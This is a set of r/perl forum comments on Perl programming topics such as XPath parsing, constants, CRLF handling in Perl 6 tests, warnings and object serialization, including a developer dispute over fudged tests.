I think I'd just use `select` instead. E.g. open ( my $output, '&gt;', 'file.out' ) or die $!; select $output; Future print statements will then all go to this file. 
You don't need to close it. It'll get closed automatically at the end of your program :)
Can we get some slightly more timely moderation of this subreddit?
Would you like the translated code to be of the same low quality?
Presumably the "Nope!" means "don't do that". It works, in the sense it assigns `1` to $scalar, but it warns, because the other two values are thrown away. To suppress warnings: quietly my $scalar = 1, 2, 3;
It's like templates for your code. For example, type "if" and it fills in all that stuff defined.
You could learn perl6 instead of perl5. It seems to be a great up and coming language.
That's a really clever hypothesis. So what I did was I edited the webpage file and removed the Chinese characters from it, re-ran it, and I still wasn't getting the final tr element. It's a little hard to diagnose since I'm brand spanking new to xPath. I'll keep plugging away at it. If you have any ideas, I'm all ears!
Hey dheff, thanks for replying. I just spent the last hour or so looking at this and wrote a response to /u/commandlineluser , whose code also printed 7 nodes. Can you take a look and let me know what you think? Thanks! https://www.reddit.com/r/perl/comments/5th6mf/xpath_search_isnt_returning_everything_i_think_it/ddn7y58/
Sorry - when I say works I meant it prints 7 yes. Here is the HTML you gave us from `webpage.html` &lt;tbody&gt; &lt;tr itemscope="" itemtype="http://schema.org/MusicGroup"&gt; &lt;td width="10%" class="text-center"&gt;&lt;span class="fa fa-microphone" style="" data-toggle="tooltip" title="" data-original-title="Hosts"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td width="90%" itemprop="name"&gt; Gwilym,&amp;nbsp;Fiona Tian,&amp;nbsp;Gwilym,&amp;nbsp;Fiona Tian &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="text-center"&gt;&lt;span class="fa fa-key" style="" data-toggle="tooltip" title="" data-original-title="ID"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td&gt;2815&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="text-center"&gt;&lt;span class="fa fa-bar-chart" style="" data-toggle="tooltip" title="" data-original-title="Difficulty"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td&gt;Newbie&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="text-center"&gt;&lt;span class="fa fa-calendar" style="" data-toggle="tooltip" title="" data-original-title="Published"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td itemprop="datePublished"&gt;December 22, 2015&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="text-center"&gt;&lt;span class="fa fa-lightbulb-o" style="" data-toggle="tooltip" title="" data-original-title="Topics"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td&gt; &lt;a href="https://chinesepod.com/library/tag/video"&gt;video&lt;/a&gt;, &lt;a href="https://chinesepod.com/library/tag/can"&gt;can&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class="text-center"&gt;&lt;span class="fa fa-wrench" style="" data-toggle="tooltip" title="" data-original-title="Functions"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td&gt; &lt;a href="https://chinesepod.com/library/tag/saying+no"&gt;saying no&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td class="text-center"&gt;&lt;span class="fa fa-puzzle-piece" style="" data-toggle="tooltip" title="" data-original-title="Grammar"&gt;&lt;/span&gt;&lt;/td&gt; &lt;td&gt; &lt;a href="https://chinesepod.com/library/tag/269?type=grammar&amp;amp;name=%E4%B8%8D+%28b%C3%B9%29" title="Main Index &amp;gt; Parts of Speech &amp;gt; Adverbs &amp;gt; Types &amp;gt; General &amp;gt; 不 (bù)"&gt;不 (bù)&lt;/a&gt;, &lt;a href="https://chinesepod.com/library/tag/695?type=grammar&amp;amp;name=what" title="Main Index &amp;gt; Parts of Speech &amp;gt; Pronouns &amp;gt; Types &amp;gt; Interrogative Pronouns &amp;gt;什么 &amp;gt;问事物 &amp;gt; 什么 (shénme) &amp;gt; what"&gt;what&lt;/a&gt;, &lt;a href="https://chinesepod.com/library/tag/708?type=grammar&amp;amp;name=can%2C+may" title="Main Index &amp;gt; Parts of Speech &amp;gt; Auxiliary Verbs &amp;gt; Types &amp;gt; General &amp;gt; 可以 &amp;gt; can, may"&gt;can, may&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; There are 7 `&lt;tr&gt;` tags. You are right though - in the example you've given above there are 6 `&lt;tr&gt;` tags. Notice though that there are trailing `&lt;td&gt;` tags after the last `&lt;/tr&gt;` - so yes the DOM is adding a `&lt;tr&gt;` around them. It's easier to see with a small example e.g. &lt;table&gt; &lt;td&gt;hello&lt;/td&gt; &lt;td&gt;hi&lt;/td&gt; &lt;/table&gt; If you open that with Inspect you will see &lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;table&gt; &lt;tbody&gt;&lt;tr&gt;&lt;td&gt;hello&lt;/td&gt;&lt;td&gt;hi&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; It added `&lt;html&gt;` `&lt;head&gt;` `&lt;tbody&gt;` and `&lt;tr&gt;` The disconnect is that the DOM is the representation after the HTML has been rendered by your browser - so the 2 may differ. http://stackoverflow.com/q/13070190
Well, there's quite a few that do something similar. But did you know that technically speaking, [perl is a functional programming language](http://stackoverflow.com/questions/31046327/which-features-of-perl-make-it-a-functional-programming-language)? But for me, in addition to `map` you've got `grep` and also inlining of regular expressions or shell tests. So you can do things like: my @numbers = map { /(\d+)/g } @stuff; my @dirs = grep { -d } glob ( "/path/to/stuff" ); 
[removed]
It definitely has a lot of functional features as evidenced in the Functional programming in Perl book, but I'm not really sure what the hardcore definition of FP is. I've heard it said a function with inputs X will always have to return Y. Due to mutable globals, I'm not sure if that is true, but I'm being a little picky here :). I really like your examples btw. Especially in short throwaway code, terseness can be a huge time saver. I do a lot of data munging, so any boilerplate can be tedious.
The thing I particularly like is that the 'terseness' works quite well for one liners. I wouldn't call one liners good style for persistent examples (well, unless you're using perl as a "sed" drop in) but it's quite handy to illustrate a concept or quickly accomplish a task. But then - unlike some of the alternatives - you can unpack the one liner into 'code' that lets you flesh it out with the thing that 'good' code needs, like structure and comments and tests :)
Perl has it's roots in old school unix. It's the glue (or the duct-tape depending on your metaphor) that keeps those systems working smoothly. If you like playing in the *nix CLI then Perl is definitely for you. If you want to develop fancy responsive webpages, or superfast architecture specific code then maybe it's not for you. It really depends on what your application is, and where you like to play.
&gt; I'm really concerned that we ran the exact same code and got two different results. May I ask your platform? Well the reason for differing results is because the HTML is different. I'm assuming the HTML you have us (the filedropper URL) - you copied that from the DOM? And it wasn't the HTML you fetched via Mechanize? Using your POC example (that only contains 6 `&lt;tr&gt;` tags) yields the same results as you got. &gt; I guess Mojolicious would replace both Mechanize (for loading) and Treebuilder (for tree creation and selector querying). Is that about right? Yeah that's right - it's all preference though - if Mechanize and TreeBuilder are working for you - then no need.
Huh! It doesn't warn at the REPL: &gt; my $x = 1, 2, 3 (1 2 3) I took this response to mean that `(1, 2, 3)` was assigned to `$x`, but it seems I was wrong.
&gt; Well the reason for differing results is because the HTML is different. &gt; I'm assuming the HTML you have us (the filedropper URL) - &gt; you copied that from the DOM? And it wasn't the HTML you fetched via Mechanize? LOL. Of course. Sometimes when you stare at a problem for too long you go slightly nutty. I think it's time to put this down for a day. :-) Thanks for your help! I really appreciate it, and I learned some really valuable stuff!
There are a couple of interesting features in perl that are worth a mention, as I don't think they really exist in other languages. Taint mode, with enforces taint checking on anything from userspace. It basically doesn't let you use "tainted" variables until you sanitise them for a bunch of commands at risk of injection exploits. (Like open, system, etc.) Tie. Which allows you to implement a class like mechanism for a "normal" perl data type. Used sparingly, because it can be action at a distance. It's particularly useful for testing. But you can do things like have different databases all accessed through a hash style variable. Autovivification - you can implicitly create hash structures by setting a value down the tree. my %hash; $hash{key}{subkey}= 'value'; Just works. The DATA file handle. Didn't used to like it, but now do because it lets me write example code quite easily. But it's also quite nice for any sort of inline stuff, like for example templating HTML. while ( &lt;DATA&gt; ) { print; } __DATA__ Some lines Of example text Here. 
While useful from time to time, I would unfortunately classify most of these as more of language warts. Tied objects can be surprising as you mentioned, and are generally quite slow compared to other solutions. Autovivification is a common newbie trap as the rules for when it does and doesn't occur aren't always clear. And the DATA handle, while generally fine to use, has some [suboptimal](https://metacpan.org/pod/perldata#Special-Literals) and [strange](https://metacpan.org/pod/SelfLoader#The-__DATA__-token) behavior.
I am a fan of `Const:Fast`. I've written on [this][1] [topic][2]. [1]: https://www.nu42.com/2016/05/perl-define-constants.html [2]: https://www.nu42.com/2015/03/hands-off-that-constant.html
[constant](https://metacpan.org/pod/constant) is a straightforward core pragma, which has the caveat of somewhat unexpected functionality. It creates constant subroutines, which thus can't be interpolated and need extra syntax to be used as hash keys (e.g. `$hash{FOO()}`). Also, a "constant" reference doesn't affect the referenced contents, an array reference will still be modifiable. The main benefit to constant subroutines is that the compiler can often optimize logic using them, for example `if (FOO) { say 1 } else { say 2 }` may just become `say 1` if FOO is a true constant. [Const::Fast](https://metacpan.org/pod/Const::Fast) and the newer [ReadonlyX](https://metacpan.org/pod/ReadonlyX) would be my recommendations for a more intuitive read-only declaration of standard variable types.
I think Ruby stole those features. It does have the "taint" feature. I might be misunderstanding the autovivification thing, you can set default values for undefined hash or array values like this: hash = Hash.new{ 'default value' } hash[:key] = 'new value' puts hash[:key] # =&gt; 'new value' puts hash[:undefined_key] # =&gt; 'default value' Arrays are a little different. It also has the DATA feature (it's tagged as `__END__`, but accessed with `DATA`) Perl 6 got it's revenge by stealing a lot of features from Ruby and adding a lot of stuff Ruby doesn't have. The ability to type variables is something sorely missing in Ruby. The performance penalty for having an array of untyped variables has to be pretty enormous. Edit: Now I get the autovivification thing. Ruby does support it, but it's slightly more complicated than just setting default values.
A read-only variable with a sigil is what Const::Fast and ReadonlyX provide. There is still one caveat there, as described in the [Const::Fast](https://metacpan.org/pod/Const::Fast#CAVEATS) docs, that the (fast) readonly api that these modules use does not distinguish between making a hash "readonly" and "restricted/locked", leading to things like errors upon accessing nonexistent keys, which you wouldn't expect from a simply read-only hash.
Yup, read the modules, like `Const::Fast`, still surprised this functionality wasn't adopted into the Perl5 core. 
I have used highcharts and workd perfectly for me.
You mean `@projects = grep { $_ eq 'migrated' } @{$data-&gt;{'values'}}`?
Regarding the syntax check: I write my Perl in Komodo IDE which has an option to let syntax checks run against the buffer ~2s after each edit, and then underline all errors found and display them in a list in a window below. It has been invaluable in keeping myself from committing buggy code.
I do the same in PerlySense (syntax + Perl::Critic rules) when files are saved, which I find more useful since very often the code isn't syntactically correct just beacause I happen to stop typing :) https://metacpan.org/pod/release/JOHANL/Devel-PerlySense-0.0218/lib/Devel/PerlySense.pm#Displaying-Code 
I could also configure it for Perl::Critic, but that takes too long for how i use it. Without that just the syntax check is so quick, and runs background anyhow, that having it run whenever i stop typing isn't an issue. :)
Sounds good.So we converted array to scalar and than do grep.
That's not how it works. Read [perldoc -f grep](http://perldoc.perl.org/functions/grep.html).
I'm not an expert, but I don't think you can do that directly. You need to make a reference to your pointer and bless it using [sv_setref_pv](http://perldoc.perl.org/perlguts.html#Blessed-References-and-Class-Objects), then dereference on entry to the subroutine. 
This perl option: https://metacpan.org/pod/distribution/perl/pod/perlrun.pod#-c
Oh, does it not run in the background?
NOTE: This also runs some parts of the Perl code, so don't use it willy-nilly on random code if you suspect it might do unintended things.
[removed]
Sorry, sloppy reading on my part. I was just confused because it normally doesn't take that long for PPI to parse the files, so it's worth the wait. And in fact, when using PerlySense it makes even more sense, because the rest of PerlySense also uses the cached PPI document, so all other operations are faster if they have a pre-parsed document to work with.
Yeah in my case there's no caching happening.
&gt; When reading text files on platforms where EOL is different than 0x0a, the platform specific EOL sequences in text streams are converted to a canonicalized form when reading. When writing out text streams, the canonical EOLs are converted to the platform specific byte sequence. Can you clarify in your post how it's done? (I am aware there is a filehandle layer that can be applied, but I'm not sure if this is what you're thinking of, but regardless it would be useful for readers to see directly in the post what the right way should look like.)
I am not sure what you are asking. There are several examples in the text.
No, time is finite, and I am done with Perl 6 for the moment. I did report various issues. Don't miss the forest for the trees: Sure, my post is motivated by my discoveries in Perl 6 tests, but it is more about how lying to yourself and future contributors in tests is counter-productive. Also, keep in mind that until [December '15][1], among other things, you ***had to*** to use CRLF in your source code if you wanted Perl 6 spec tests to pass. There [was resistance to fixing that][2], but eventually there was a fix. It seems the fix was not done at the appropriate abstraction level, so `Proc::Async` doesn't work. This is an architectural problem. An architectural problem that remained undetected because the tests were lying. PS: By the way, this is open source. I brought the problem to the attention of a broader group of people. Someone else can also fix those tests. [1]: https://www.nu42.com/2015/12/perl6-newline-translation-broken.html [2]: https://irclog.perlgeek.de/perl6/2015-12-14#i_11712501
&gt; perl -wE "$x = `perl -E ""say 'hello'""`; say 'ok' if $x eq qq{hello\n}" &gt; There we go. This example prints OK regardless of what the platform specific EOL sequence is because text streams are correctly implemented. Oh I see, you were actually saying that capturing the output of one process in another was how to test all output while remaining EOL-agnostic. You can actually do this all in one process, with the `:crlf` IO layer -- see `perldoc PerlIO`. Just push text through a filehandle with that layer applied, and text will 'decode' into unix-style line endings for comparison e.g. in a test.
&gt; you were actually saying that No, I wasn't. &gt; You can actually do this all in one process, with the `:crlf` Of course. By default, on Windows, text streams in Perl have the `:crlf` applied to them, unless you `binmode` them. That is a another way of saying "Perl handles CRLF translation". The post is in the context of some Perl 6's spec tests for launching a process asynchronously and capturing its output. I noticed a test was failing because Perl 6 was not handling CRLF translation. Zoffix discovered that more tests would have been failing except that the tests were written to mask the fact that Perl 6 was not handling CRLF translation. 
Perl is still extremely useful, so much so, that in last year's Stackoverflow survey Perl programming was in the top 10 of best paying IT jobs in the US. The reason: big companies, including Wall Street, are chock full of Perl tooling and are desperate to find Perl programmers. And it's not very popular now. Which is strange, because Perl owns all your paradigms. You want to do OO? Check. Functional programming, higher order functions, closures? Check. One liners instead of sed and awk? Check. Web frameworks? Check. Mojolicious actually beats the hell out of Python's Flask, with websockets and non-blocking everything out of the box.
&gt; Zoffix discovered that more tests would have been failing except that the tests were written to mask the fact that Perl 6 was not handling CRLF translation. Look, I know you have an unhealthy obsession with quoting me all over the place, but would you please stop misrepresenting what I say? Never once did I suggest the kludges were written to mask anything.
Open Source isn't about someone else doing the work. It's about people working together as unpaid volunteers. Using words like "deception" and "lying" isn't helpful in motivating people or particularly accurate technically. 
This is a way of saying that Perl 5 does something magical behind your back on your behalf that usually works, and has a way that you can tell it to stop doing that. There was a period of maybe a few days where Rakudo did something like that. It caused more problems than it solved. As far as I know very few languages do line ending normalization. Ruby doesn't even do that as far as a quick search determined, and it is by far the closest language to Perl 5 as far as the runtime semantics. Perl 6 tends to constrain itself to only doing the magical things you ask for. I'm not saying the Perl 5 way is bad, just that Perl 6 takes a different path. If the test instead called the `.lines` method, or `.split(/\n/)` it would have worked correctly cross-platform, and would still work if any of U+000A, U+000B, U+000C, U+000D, U+0085, U+2028, U+2029, U+000D + U+000A were used to separate lines instead. There should probably be a `.shell` method on Proc::Async so that the `|&lt;cmd \c&gt;` workaround doesn't have to be hard coded in the test.
&gt; Who do Perl 6 devs have to deceive anyway? Themselves and future developers who are fooled by false negatives and confused by false positives. That's why it's harmful to fudge tests into passing. Also: &gt; Jokes on me for wasting time and teaching you to run the tests All you did was to point out to me there was a `stresstest` target in addition to the `spectest` target I had been using. Thank you very much for that. I could never have figured that out myself. The reason I was trying to run all those tests was because you had mentioned there were "[known failures][1]" on Windows and I wanted to make sure [my patches][2] did not make anything worse. It took me running the tests to find out that test failures were being swept under the rug by fudging them. I do appreciate that you stress tested my patches under Debian to ensure I did not break anything on non-Windows platforms. [1]: https://github.com/MoarVM/MoarVM/pull/528#issuecomment-279148947 [2]: https://github.com/MoarVM/MoarVM/pull/528/files?diff=split
&gt; Open Source isn't about someone else doing the work. Exactly. I did some of the work. I may do the rest of the work some other time or someone else may contribute. In the mean time, if I want to write about things I noticed, I can write about them without having to first fix everything. In particular, you do not get to decide whether I spend my time fixing Perl 6 or blogging about things I discover. &gt; Using words like "deception" and "lying" isn't helpful in motivating people or particularly accurate technically. A test that should fail is coerced in to passing by fudging the result. That is a false negative that *deceives* the person running the test into believing that everything works when it doesn't. In other words, the test is lying to the person running the test. That should not be hard to understand.
&gt; Ruby doesn't even do that as far as a quick search determined, [This][1] seems to contradict that: &gt; `binmode` → `ios` &gt; Puts ios into binary mode. Once a stream is in binary mode, it cannot be reset to nonbinary mode. &gt; * newline conversion disabled &gt; * encoding conversion disabled &gt; * content is treated as ASCII-8BIT [1]: http://ruby-doc.org/core-2.4.0/IO.html
You did miss the mark, the problem is with the test. Also `\r\n` **is normalized**. It is normalized to a synthetic so that it can be handled as a single grapheme just like Unicode says it should be. say "\r\n".chars; # 1 Perhaps Proc::Async could have an attribute or two that will split the input to the `stdout` and `stderr` supplies by using the associated `.nl-in` attribute to simplify `.act`ing on them. Also you are asking for the input to be processed twice, once by the internals, and then once by user code. And the first pass doesn't do that much to simplify user code. The `.lines`, `.words` , and `.comb` methods do process it in a very similar way, but simplifies user code dramatically. Basically you are asking for slowing down all Perl 6 programs for what I would argue is bad Perl 6 code. ( Even when the feature would be off, the check to see if it should do it would cause a small performance penalty. ) The major use case that I can think of where it was useful in Perl 5 code is when you don't `chomp` the incoming lines. Perl 6 chomps the incoming lines. If you really want it like Perl 5: # undo the auto chomp, and normalize; my @lines = eager $*IN.lines.map: { $_ ~ $*IN.nl-out }; # must be eager so that it gets processed beforehand like Perl 5 would for @lines -&gt; $_ is copy { # first thing you should do in Perl 5 when dealing with lines # is to chomp the newline from it $_ .= chomp; ... } Now we both know that the right way to do it in Perl 5 is to use `while (readline STDIN){…}`, in which case just remove the `eager`, and swap `@lines` with `$lines` to get basically the same semantics. Actually now that I've thought about it a while, the major reasons I used `:crlf` in Perl 5 is for it's output behaviour, and to get around the fact that that `$/` couldn't be set to an array or a regex. `.nl-out` and `.nl-in` take care of both of them if you use the right features. So again I would say that such a feature would mostly be used in bad Perl 6 code. There are plenty of times that programmers that are new to Perl 6 ask for features, or additions to features that if implemented would completely break other features of the language. For example someone asked for something like `$foo.bar( * - 5 )` to become `-&gt; $_ { foo.bar( $_ - 5 ) }` instead of `foo.bar( -&gt; $_ { $_ - 5 } )`. That would have possibly broken `@array[*-1]` and would definitely break `@array.pick(*)`. Do you _honestly_ believe you know enough about the design of Perl 6 that you _know_ this isn't going to do something similar? See [Dunning–Kruger effect](https://en.wikipedia.org/wiki/Dunning%E2%80%93Kruger_effect)
&gt; derogatory post Nothing in there is derogatory: In fact, as I [mentioned][1] I was originally very pleased with how many tests were passing: &gt; I am encouraged by how few failures I observed (and by the fact that I think a lot of the failures are related so fixing one may fix many). Soon after, I filed a [bug report ][2] while investigating those few failures. You then helpfully [pointed out][3]: &gt; Looks like several other tests in `S17-procasync/basic.t` would be failing as well if it weren't for the explicit kludges added to replace `"\r\n"` to `"\n"`. And `grep -nFR '\r\n' | grep subs` shows 32 potential places with a similar workaround. which alerted me to the false negatives, i.e. deceptively passing tests. There is an objective lesson to learn here for every programmer: Don't shut up failing tests using kludges. Use a [TODO][4]: &gt; You don't skip tests which are failing because there's a bug in your program, or for which you don't yet have code written. For that you use `TODO`. ~~On the other hand, [once again resorting to calling me names in public][5] for daring to write about stuff that interests me is rather mature~~ [1]: https://github.com/perl6/roast/issues/232#issuecomment-280061047 [2]: https://rt.perl.org/Public/Bug/Display.html?id=130788 [3]: https://rt.perl.org/Public/Bug/Display.html?id=130788#txn-1448881 [4]: https://metacpan.org/pod/Test::More#TODO:-BLOCK [5]: https://irclog.perlgeek.de/perl6/2017-02-17#i_14120283
The particular comment you linked to does not call anyone names. "I wasted time like an idiot" is referring to oneself. Not that I am defending anyone's behavior in this situation.
I misread it. Thank you for pointing it out.
I'm always happy when i see people making suggestions for tangible changes and additions to Perl. :)
Module::Pluggable a good avenue of investigation as well after learning the fundamentals. https://www.slideshare.net/mobile/miyagawa/writing-pluggable-software
I have to imagine there's a decent middle ground between all this in conjunction with golang's all loops use 'for' syntax 
Err, no. Please *don't* do this.
&gt; I know at least some people think no one ought to write about anything unless they have filed bug reports and sent patches in triplicate with the blue copy stamped and filed with the Open Source Planning Agency or something, but, rest assured, I will do all that Good. Although, even though you managed to get a wrong impression to the point of getting snarky: You could just as well simply drop a ticket pointing to your blog post. Anything that elevates the post from "yelling into the wind" to "actually has more than a snowball's chance in hell to effect change". Oh, and i'm extremely happy to see work being done towards improving Perl5's usage of the windows APIs. A lot of that was done to get things working under very early Windows versions and then never touched again. Some of it isn't even correct but merely functional for older Windows versions.
What I would like is a global variable $_i which is set to iteration count during and after the loop. It is especially convenient to have it in a `foreach` loop. For your `else` need, it is simply: for/foreach/while/...{ ... } if($_i==0){ ... } The problem with `else` is it is ambiguous other than in a `if` case. For example, following the loop, I often want the else when I used `break` out of the loop. Of course you can define what `else` means after a loop (as you did), but it is not intuitive.
Yeah, if I had one penny every time I have to write this time reporting line ... I don't like to use a module here because it is such simple thing and doesn't worth the mental load of searching, picking, and remembering even the package name for. However, this in general is a simple integer base transformation problem so we could use a function such as: my @t = bases($t, 60, 60, 24); print "$t[3] days $t[2] hours $t[1] minutes $t[0] seconds\n"; I think Perl should have this function built-in.
[removed]
Yay! I've been waiting for this fix for a long time. This was a common problem as a developer in Japan.
I clicked /u/garfieldnate, found [your resume](http://garfieldnate.github.io/resume/resume-en.html) and note "Turkish-Japanese translation system". So it sounds like you may have been doubly impacted. Ouch. I'm curious what you recall and/or can link to re opinions among developers in Japan (on SO or among co-workers or at perlmonks etc.) about these shortcomings. For example, did devs consider it to be mostly Windows' fault or a proglang problem? If the latter, was this considered a serious Perl specific failing or something common to most/all langs considered to be in the same class in general? Did folk try to get ActiveState (a key player in the Perl on Windows space) involved? Did you get the sense that core Perl devs were generally aware of the core problems and interested in possible solutions as identified by Sinan or that there seemed to be a lack of awareness or disinterest? Etc. Thanks for posting here and TIA for anything additional you care to share. :)
Nice to see perlbuzz back \o/
Not sure this is possible if you're using oracle instead of mongo or postgres because seemingly no good solution exists on cpan surrounding oracle async. Maybe tying together anyevent::dbi and dbix::connector could get you there, but I'm not sure. dbd::oracle is blocking and has no async support like dbd::pg so the best you might be able to do is a bunch of separate processes. Some googling shows there [has been discussion ](http://www.nntp.perl.org/group/perl.dbi.users/2005/05/msg26683.html)but apparently never any work to attempt to implement OCI [non blocking mode](https://docs.oracle.com/cd/B13789_01/appdev.101/b10779/oci02bas.htm#462819) to dbd oracle. Nowadays Coro could probably help along the implementation. 
Well actually the code is still wrong as it doesn't take into account time zone changes and leap seconds. However, this probably doesn't matter for this use case.
Oh yes - very useful, thanks!
&gt; Madame Experience runs an expensive school, but fools will learn in no other.
I agree with the methodology and conclusions. Cool article.
In your `restore` method, `$self` contains a reference to the object. Then you set `$self` to a new reference to a different object, but you don't do anything with it. The original object is left unchanged. Btw, do not use empty prototypes in perl, they are ignored during method invocation anyway. sub restore { local $/ = undef; # Unset the input record separator. open FILE, $filename or die "Couldn't open file: $!"; my $string = &lt;FILE&gt;; close FILE; $_[0] = eval $string; # Replace the object with a different one } Personally, I wouldn't design the class this way in the first place. I would use restore() as class method instead and have it return the object rather than having to worry about replacing it. # in restore() return eval $string; # in script my $p = PodInfo-&gt;restore(); Don't use indirect object notation (`method Class()`) either. Perl is not Java and the only reason indirect object method calls work at all is heuristic magic. my $p = PodInfo-&gt;new;
OK, I understand you but it's slippery. My problem is that when I think of $_[0], a reference, I think of it as an 8 byte memory location that contains the address of the class instance. That is, $_[0] points to the class instantiation. Then, my $self = $_[0] would contain the same address -- $self would also be an 8 byte area that stores the address of the class as well. In C... double d = 1.0; double* ptr1 = &amp;d; double* ptr2 = ptr1 whether I make changes to ptr1 or ptr2, the original variable will change. But from your example, I see this is the wrong paradigm to think about. Thanks for explaining this, I really did learn from your explanations. (BTW, my code works now thanks to you, but I *really* appreciate the time you took to explain it.) 
&gt; Then, my $self = $_[0] would contain the same address It does contain the same address. But you change the address of `$self` in the last line of your original `restore` method. Your `eval` creates a new object (reference) with a new, different address. Assigning that to `$self` gives `$self` a new address, but as `$self` is a *copy* of `$_[0]`, it does not give `$_[0]` a new address. It would be like doing the following in C: double d = 1.0; double* ptr1 = &amp;d; double* ptr2 = ptr1 double e = 2.0; ptr1 = &amp;e; And then wondering why ptr1 and ptr2 don't point to the same thing anymore. In order to work like you are thinking, you would have to *dereference* your references first. So instead of technique in my first reply with `$_[0]=`, you could also do the following: %$self = %{eval $string}; #assuming eval $string returns a hashref. Or less tersely: my $newself = eval $string; %$self = %$newself; #assuming $newself is a hashref
Problem is, ssh is hard to do well and it's already been done. There's obviously not a queue of people waiting to reinvent the wheel. I did find [this] (http://www.hanselman.com/blog/ItsHappeningOpenSSHForWindowsfromMicrosoft.aspx) which might give you some hope.... 
Whilst I haven't looked into the libraries it's great to see some movement in this area for Perl. 
[removed]
I understand 100%. You explained that well -- thank you! 
I recommend that you paste the output of the failing tests.
tl;dr
In case you are interested in better methods of serializing objects, I recommend taking a look at [Sereal](https://metacpan.org/pod/Sereal); there is also the core module [Storable](https://metacpan.org/pod/Storable). Both allow custom hooks for object classes to define how they are serialized (freeze) and restored (thaw), and Sereal has several options to dictate how blessed references (objects) are treated. I view Data::Dumper as more "accidentally" useful for serializing.
[removed]
I think warnings are best described as a *strong indication* that the developer was programming by coincidence, i.e. trying this and trying that until something seemed to work. There are, however, times when a programmer needs to accomplish something and warnings can't be avoided - but these should be rare occasions, indeed. The litmus test is asking the developer why a warning is being generated. If they can't explain clearly what is happening and why then alarms should be ringing.
Two caveats u/szabgab should add: 1. Don't use FATAL directly, it comes with gotchas that are worked around safely by https://metacpan.org/pod/strictures 2. Don't use the perl run flag -w, and particularly not in the hashbang. It will force warnings on for code that was designed to be run without them.
Will do I'll be looking into it more on Monday. I'll let you know what I find out
Be careful when you upgrade a perl, though. New warnings show up. I've dealt with one instance where that brought the servers down as these new warnings ate up the rest of the disk space. If no one is monitoring the logs, warnings in production aren't helping you. I tend to peg production code to particular and concrete perl installations (so, no /bin/env finding some perl I don't know about).
I think that your point is that Perl 5 has features that are best not used. But I wouldn't use the phrase *undefined behavior* here, as it has a defined meaning in computer science. It means that language implementations get to choose how they want to implement a language feature. For encouraging good practices in Perl 5 I suggest that you take a look at [Perl::Critic](https://metacpan.org/pod/Perl::Critic). 
My point is, there are areas in the language that are well defined by a certain compiler but nevertheless have no common sense meaning, and the language (not the compiler) should claim those areas undefined (by the language but nevertheless definite by certain compiler implementation). This is different from style guide as Perl::Critic would distinguish. To illustrate: ``` print "Hello World\n"; ``` Perl::Critic would point out that you didn't `use strict;`, but there is no ambiguity on what the common-sense meaning is here. It is well defined, although it may not be recommended (because you are a critic :)). Now, ``` my $pi = 3.14.596; ``` There is no common sense meaning here. Perl would happily put this into a string, but is it a common sense expected behavior? Even as a version string: ``` my $TeX_version = v3.14159265; ``` , are we sure about its behavior here? In another example, which is actually *defined* in most languages but I argue should be *undefined*: for ($i=1,$j=100;$i&lt;100;$i++,$j--){...} $i, $j; The first one is a well-intended usage and there is no common sense ambiguity. How about the second one? Are we sure about what is the intended behavior here?
Undefined behavior can be occasionally useful. Almost all of the undefined behaviors in C are there because they allow efficient and simple code. Otherwise, we don't need undefined behavior, we should simply specify them as errors. However, relying on undefined behavior (vs. simply ignoring its effect), then you are making non-portable code that depends on particular compiler and version. In another word, you are taking your code out of common sense domain into your particular sense domain. That is fine, everyone is allowed to have his own quirks and that is how we are efficient and special. But do not expect your eccentricity to be appreciated or even respected outside your own domain. So for your code, you need to take up the responsibility of maintaining it, because it is going to puzzle another code reviewer until they learn your intention and accept your practice. I love eccentricity. That is why I think all programmer should maintain their own compilers to some degree (maybe in some future era). This actually has a parallel in the way we use our natural language. We all love to have certain signature idiom and slang of our own. We manage that by maintaining our own ability to translate its meaning.
That is an attitude. Time (and history) is irrelevant in logic. And then, isn't 30 years too short (considering our natural language)? Or maybe too old (considering how we typically perceive trend and modern)? And to clarify, I have no intention to change anyone's attitude (common sense or not). *read: I respect your attitude.* But in case someone's attitude is toward a merit discussion, I am here :).
Hi there. I'm considering a statistical approach here. I setup an array, one element per row, and determine the highest column in each row that has a value. And then I started wondering about a 2d array, storing which cells have values and which ones don't, in order to not be fooled by an outlier. Still trying to get my head around how to analyse the matrix to determine it's actual shape.
No, just a rust-y car. He was busy buckling up his 3 seat-belts, which isn't easy when you wear your back protector, knee braces, elbow guards and padded body armour below your NBC suit and you can't see the traffic because of your helmet.
I eschew vanity tags. 
To be fair there really isn't anything that *is* undefined behaviour in Perl 5. There is what `perl` does and that determines what Perl 5 is. Sometimes there is something that comes about by accident that later gets removed after someone finds it. In the versions that this works in, it is part of Perl 5 sub foo { my $bar = -1 if 0; # accidental state variable ++$a; } say foo; # 0 say foo; # 1 say foo; # 2 This is why Perl 6 is defined by a set of tests, and not an implementation.
Hey, hey, hey, the war's over, php and perl seem to be better off as friends now, eh?
This guy? https://www.flickr.com/photos/27449144@N00/194335920
They make you more recognizable to local law enforcement... But they're so much fun!
